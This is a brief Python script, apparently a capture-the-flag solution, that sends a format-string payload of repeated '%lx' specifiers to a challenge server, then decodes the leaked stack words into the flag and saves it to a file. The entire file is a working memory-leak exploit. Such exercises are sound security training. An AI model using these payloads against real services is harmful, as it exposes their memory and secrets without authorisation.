import socket
import binascii

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(('cns.ctf.tw', 7002))

# Dump 6 + 1 + 10 chunks
msg = ' '.join(['%lx'] * 17)

# Send something
data = client_socket.recv(1024)
client_socket.send(msg + '\n')

# Catch the flag
data = client_socket.recv(1024)
data = data.split()[7:12]

# Deal with the str
res = ''
for d in data:
    d = '0' * (16 - len(d)) + d
    res += d.decode('hex')[::-1]
res = res[:res.index(chr(0))]

with open('ans2-1.txt', 'w') as f:
    f.write(res)
